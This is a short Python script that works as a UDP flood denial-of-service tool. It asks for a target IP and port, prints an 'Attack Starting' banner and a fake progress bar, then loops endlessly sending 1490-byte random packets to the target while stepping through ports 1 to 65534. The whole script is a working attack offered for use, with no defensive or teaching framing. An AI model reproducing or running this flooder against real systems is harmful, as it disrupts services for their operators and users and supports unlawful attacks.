import requests
import time
import os
import sys
import pyfiglet
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

banner = pyfiglet.figlet_format('Attack Starting')
print(banner)
ip = input("IP Target : ")
port = int(input("Port       : "))  # Convert the input to an integer

print("[                    ] 0%")
time.sleep(2)
print("[===                 ] 25%")
time.sleep(2)
print("[=======             ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(2)
sent = 0

while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1
